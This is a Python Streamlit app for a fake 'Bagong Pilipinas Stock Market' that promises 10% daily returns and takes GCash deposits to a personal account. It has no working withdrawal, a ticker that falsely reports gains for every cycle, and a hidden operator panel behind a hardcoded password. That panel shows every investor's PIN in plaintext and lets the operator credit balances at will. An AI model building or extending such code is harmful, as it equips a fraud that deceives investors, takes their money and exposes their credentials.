import streamlit as st
import json
import os
from datetime import datetime, timedelta
import time
import random
import pandas as pd

# --- DATA HELPERS ---
def get_status_msg():
    if os.path.exists("status.txt"):
        with open("status.txt", "r") as f: return f.read()
    return "Market cycles are currently STABLE."

# --- 1. SESSION INITIALIZER ---
if 'user' not in st.session_state: st.session_state.user = None
if 'page' not in st.session_state: st.session_state.page = "main"

# --- 2. DATA ENGINE ---
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)

# --- 3. PREMIUM MOBILE UI ---
st.set_page_config(page_title="BPSM Official", layout="wide")

st.markdown("""
    <style>
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }

    .banner {
        background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%);
        padding: 40px 20px; text-align: center; border-bottom: 5px solid #0dcf70;
    }
    .banner h1 { font-family: 'Arial Black'; font-size: 2.2rem; color: white; margin: 0; line-height: 1.1; text-shadow: 2px 2px #000; }
    .banner p { font-size: 0.95rem; color: #ffffff; margin-top: 15px; font-weight: 600; line-height: 1.5; }

    .user-box { text-align: center; padding: 30px 10px; background: #111217; border-bottom: 1px solid #2a2b30; }
    .balance-val { color: #0dcf70; font-size: 3.5rem; font-weight: 900; margin: 5px 0; }
    
    .news-card {
        background: #1c1e24; border: 1px solid #0038a8; padding: 15px;
        border-radius: 15px; margin: 15px; border-left: 5px solid #0038a8; font-size: 0.9rem;
    }

    .section-header { 
        background: #1c1e24; padding: 12px 20px; margin-top: 25px; 
        border-left: 5px solid #0dcf70; font-weight: bold; font-size: 1.1rem;
        text-transform: uppercase; color: #0dcf70;
    }

    .stButton>button {
        width: 100% !important; border-radius: 15px !important; height: 4.5rem !important;
        background: #1c1e24 !important; color: #ffffff !important;
        border: 1px solid #3a3d46 !important; font-weight: bold !important;
    }
    
    div[data-testid="stButton"] > button:contains("DEPLOY") {
        background: #0dcf70 !important; color: #0b0c0e !important;
        font-size: 1.3rem !important; font-weight: 900 !important; border: none !important;
    }

    .ticker-wrap {
        background: #000; color: #0dcf70; padding: 12px 0;
        position: fixed; bottom: 0; width: 100%; font-size: 0.85rem;
        border-top: 1px solid #2a2b30; font-weight: bold; z-index: 999;
    }

    .stNumberInput input {
        color: #000 !important; background-color: #fff !important; 
        height: 3.8rem !important; font-size: 18px !important; font-weight: bold !important;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 4. ACCESS CONTROL ---
if st.session_state.user is None:
    st.markdown("""<div class="banner">
        <h1>BAGONG PILIPINAS<br>STOCK MARKET</h1>
        <p>Wholesale liquidation within 18 hours. You provide liquidity; we provide 10% daily ROI.</p>
    </div>""", unsafe_allow_html=True)
    
    t1, t2 = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    with t1:
        ln = st.text_input("INVESTOR NAME").upper()
        lp = st.text_input("SECURE PIN", type="password", max_chars=6)
        if st.button("VERIFY & ACCESS"):
            reg = load_registry()
            if ln in reg and reg[ln]['pin'] == lp:
                st.session_state.user = ln
                st.rerun()
    with t2:
        rn = st.text_input("FULL LEGAL NAME").upper()
        rp = st.text_input("CREATE 6-DIGIT PIN", type="password", max_chars=6)
        if st.button("CREATE ACCOUNT"):
            if rn and len(rp) == 6:
                update_user(rn, {"pin": rp, "wallet": 0.0, "inv": [], "tx": [], "commissions": 0.0})
                st.success("Account Created!")

# --- 5. INVESTOR PORTAL ---
else:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    # Payout logic
    active_inv = []
    payout = 0
    for i in data.get('inv', []):
        if now >= datetime.fromisoformat(i['end']): payout += (i['amt'] + i['prof'])
        else: active_inv.append(i)
    if payout > 0:
        data['wallet'] += payout
        data['inv'] = active_inv
        update_user(name, data)

    # UI Header
    st.markdown(f"<div class='user-box'><p style='color:#8c8f99;'>AVAILABLE ASSETS</p><h1 class='balance-val'>₱{data['wallet']:,.2f}</h1><p style='color:#8c8f99;'>Account: {name}</p></div>", unsafe_allow_html=True)
    
    # Navigation Buttons
    col_a, col_b = st.columns(2)
    if col_a.button("📥 DEPOSIT"): 
        st.session_state.page = "dep"
        st.rerun()
    if col_b.button("📤 WITHDRAW"): 
        st.session_state.page = "wd"
        st.rerun()
    
    if st.session_state.page != "main":
        if st.button("⬅️ RETURN TO DASHBOARD"): 
            st.session_state.page = "main"
            st.rerun()

    # --- PAGE: DEPOSIT ---
    if st.session_state.page == "dep":
        st.markdown("<div class='section-header'>📥 FUND YOUR ACCOUNT</div>", unsafe_allow_html=True)
        st.info("Transfer to the details below. Ensure the Reference Number is visible in your screenshot.")
        
        col1, col2 = st.columns(2)
        with col1:
            st.markdown("""**GCASH DETAILS:**\n- **Account Name:** T. TAN\n- **Account No:** 09XX XXX XXXX""")
        with col2:
            st.write("📲 *Scan QR for faster transfer*")

        dep_amt = st.number_input("Amount Sent (PHP)", min_value=100.0, step=100.0)
        receipt = st.file_uploader("Upload GCash Receipt", type=['jpg', 'png', 'jpeg'])

        if st.button("SUBMIT DEPOSIT FOR VERIFICATION"):
            if receipt and dep_amt >= 100:
                new_tx = {"date": datetime.now().strftime("%Y-%m-%d %H:%M"), "type": "DEPOSIT", "amt": dep_amt, "status": "PENDING VERIFICATION"}
                data.setdefault('tx', []).append(new_tx)
                update_user(name, data)
                st.success("✅ Receipt submitted! Verification in progress.")
                time.sleep(2)
                st.session_state.page = "main"
                st.rerun()

    # --- PAGE: MAIN DASHBOARD ---
    if st.session_state.page == "main":
        st.markdown("<div class='section-header'>🚀 DEPLOYMENT CENTER</div>", unsafe_allow_html=True)
        inv_a = st.number_input("Capital PHP", min_value=100.0, step=100.0)
        if st.button("CONFIRM & DEPLOY CAPITAL"):
            if data['wallet'] >= inv_a:
                data['wallet'] -= inv_a
                data.setdefault('inv', []).append({"amt": inv_a, "prof": inv_a*0.1, "end": (now + timedelta(hours=24)).isoformat()})
                update_user(name, data)
                st.rerun()

        st.markdown("<div class='section-header'>⏳ ACTIVE 24H CYCLES</div>", unsafe_allow_html=True)
        if not active_inv: st.write("No active cycles.")
        for t in active_inv:
            rem = datetime.fromisoformat(t['end']) - now
            st.markdown(f"<div style='background:#1c1e24; padding:20px; border-radius:15px; border:1px solid #3a3d46; text-align:center; margin-bottom:10px;'><p style='color:#8c8f99; margin:0;'>Active Trade: ₱{t['amt']:,}</p><div style='color:#0dcf70; font-size:2rem; font-weight:bold; font-family:monospace;'>{str(rem).split('.')[0]}</div></div>", unsafe_allow_html=True)

        st.markdown("<div class='section-header'>📜 TRANSACTION LOGS</div>", unsafe_allow_html=True)
        for t in reversed(data.get('tx', [])):
            st.write(f"**{t['date']}** | {t['type']} | ₱{t['amt']:,} | `{t['status']}`")

    # Ticker and Logout
    ticker_text = f"🔥 FLASH: Market liquidation successful! All 24H cycles closed with +10% gains."
    st.markdown(f"""<div class="ticker-wrap"><marquee>{ticker_text}</marquee></div>""", unsafe_allow_html=True)
    if st.sidebar.button("LOGOUT"):
        st.session_state.user = None
        st.rerun()

# --- 6. THE HIDDEN BOSS PANEL ---
st.divider()
with st.expander("⚠️"):
    boss_input = st.text_input("Key", type="password")
    if st.button("ENTER"):
        if boss_input == "Orange01!":
            st.session_state.is_boss = True
            st.rerun()

if st.session_state.get("is_boss"):
    st.divider()
    all_users = load_registry()
    if "show_adm" not in st.session_state: st.session_state.show_adm = False
    if st.button("🔓 OPEN / 🔒 CLOSE CONTROLS"):
        st.session_state.show_adm = not st.session_state.show_adm
        st.rerun()

    if st.session_state.show_adm:
        st.markdown("### 👑 BPSM MASTER CONTROL")
        
        # PENDING DEPOSITS APPROVAL
        st.markdown("<div class='section-header'>🔎 PENDING DEPOSITS</div>", unsafe_allow_html=True)
        for u_name, u_info in all_users.items():
            for idx, tx in enumerate(u_info.get('tx', [])):
                if tx['status'] == "PENDING VERIFICATION":
                    st.warning(f"**{u_name}** sent **₱{tx['amt']:,}**")
                    if st.button(f"APPROVE ₱{tx['amt']:,} for {u_name}", key=f"app_{u_name}_{idx}"):
                        all_users[u_name]['tx'][idx]['status'] = "SUCCESS"
                        all_users[u_name]['wallet'] += tx['amt']
                        with open(REGISTRY_FILE, "w") as f: json.dump(all_users, f, default=str)
                        st.success("Verified!"); st.rerun()

        # INVESTOR LIST
        user_creds = [{"Investor": n, "Balance": f"₱{i.get('wallet',0):,.2f}", "PIN": i.get('pin','N/A')} for n,i in all_users.items()]
        st.table(user_creds)

        # QUICK ADJUST
        st.markdown("<div class='section-header'>🛠️ QUICK BALANCE ADJUST</div>", unsafe_allow_html=True)
        target = st.selectbox("Select User", list(all_users.keys()))
        amt = st.selectbox("Amount PHP", [500, 1000, 5000, 10000, 50000])
        if st.button(f"ADD ₱{amt:,} TO {target}"):
            all_users[target]['wallet'] += amt
            all_users[target].setdefault('tx', []).append({"date": datetime.now().strftime("%Y-%m-%d %H:%M"), "type": "ADMIN", "amt": amt, "status": "DONE"})
            with open(REGISTRY_FILE, "w") as f: json.dump(all_users, f, default=str)
            st.success("Updated!"); st.rerun()
